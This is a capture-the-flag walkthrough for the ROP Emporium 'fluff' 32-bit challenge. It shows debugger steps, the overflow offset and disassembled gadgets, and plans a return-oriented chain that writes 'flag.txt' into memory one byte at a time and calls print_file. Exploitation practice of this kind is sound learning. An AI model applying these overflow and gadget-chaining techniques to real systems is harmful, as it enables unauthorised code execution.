# fluff (this example uses pwndbg):
### Challenge: https://ropemporium.com/challenge/fluff.html
###Pwndbg: https://github.com/pwndbg/pwndbg
###Video Walkthrough: https://www.youtube.com/watch?v=UM6d8DPB8wo

Setup: $ sudo pip install ropper

>   1. gdb fluff32
>   2. pwndbg> cyclic 100
```
aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaa
```
>   3. pwndbg> run
>   4. Paste the output from step 2
>   5. See the EIP register
```
*EIP  0x6161616c ('laaa')
```
>   6. pwndbg> cyclic -l laaa
```
44
```
>   7. pwndbg> disassemble usefulFunction
```
Dump of assembler code for function usefulFunction:
   0x0804852a <+0>:     push   ebp
   0x0804852b <+1>:     mov    ebp,esp
   0x0804852d <+3>:     sub    esp,0x8
   0x08048530 <+6>:     sub    esp,0xc
   0x08048533 <+9>:     push   0x80485e0
   0x08048538 <+14>:    call   0x80483d0 <print_file@plt>
   0x0804853d <+19>:    add    esp,0x10
   0x08048540 <+22>:    nop
   0x08048541 <+23>:    leave
   0x08048542 <+24>:    ret
End of assembler dump.
```
+ Observe the address to print_file: 0x80483d0

>   8. pwndbg> disassemble questionableGadgets
```
Dump of assembler code for function questionableGadgets:
   0x08048543 <+0>:     mov    eax,ebp
   0x08048545 <+2>:     mov    ebx,0xb0bababa
   0x0804854a <+7>:     pext   edx,ebx,eax
   0x0804854f <+12>:    mov    eax,0xdeadbeef
   0x08048554 <+17>:    ret
   0x08048555 <+18>:    xchg   BYTE PTR [ecx],dl
   0x08048557 <+20>:    ret
   0x08048558 <+21>:    pop    ecx
   0x08048559 <+22>:    bswap  ecx
   0x0804855b <+24>:    ret
   0x0804855c <+25>:    xchg   ax,ax
   0x0804855e <+27>:    xchg   ax,ax
End of assembler dump.
```
>   9. Notice the gadget at the top of the questionableGadgets
 + If we provide the correct masking characters for 0xb0bababa, then we can store our value in edx
```
   0x08048543 <+0>:     mov    eax,ebp
   0x08048545 <+2>:     mov    ebx,0xb0bababa
   0x0804854a <+7>:     pext   edx,ebx,eax
   0x0804854f <+12>:    mov    eax,0xdeadbeef
   0x08048554 <+17>:    ret

```
>   10. ropper -f fluff32 --search pop
```
   0x080485bb: pop ebp; ret; 
   0x08048558: pop ecx; bswap ecx; ret; 
```
>   11. Notice the `xchg` instruction gadget
```
   0x08048555 <+18>:    xchg   BYTE PTR [ecx],dl
   0x08048557 <+20>:    ret 
```
>   12. For the python exploit we will do something like this:
+ for each char in "flag.txt":


 - Pop ebp register with the char value
 - this char value will be manipulated so we put a differnt character that will mutate into the desired char
```
    0x080485bb: pop ebp; ret; 
    char                          ; the char to be manipulated
```

 - Use this gadget to store character in the edx register (while also working around the pext instruction)
```
    0x08048543 <+0>:     mov    eax,ebp
    0x08048545 <+2>:     mov    ebx,0xb0bababa   ; ebx stores this value
    0x0804854a <+7>:     pext   edx,ebx,eax      ; pext intruction of eax and ebx will be stored in edx
    0x0804854f <+12>:    mov    eax,0xdeadbeef
    0x08048554 <+17>:    ret 
```

 - Put address in the data section in the ecx register
```
    0x08048558: pop ecx; bswap ecx; ret;
    data_address_offset + index                 ; provide in big endian so bswap puts it back 
                                                ; will be stored in ecx
```

 - Keep in mind that the dl register is the last 8 bits of the edx register
 - So we're effectively writing on byte (or char) into the memory address ecx is pointing to
```
    0x08048555 <+18>:    xchg   BYTE PTR [ecx],dl
    0x08048557 <+20>:    ret
```

>   13. Get the address to data section: $ `readelf -S fluff32`
```
  [Nr] Name              Type            Addr     Off    Size   ES Flg Lk Inf Al
  [24] .data             PROGBITS        0804a018 001018 000008 00  WA  0   0  4
```
>   14. Get the mask values for "flag.txt"
+ Use get_mask.py as reference

>   15.  Compile the exploit (observe exploit.py for entire reference)


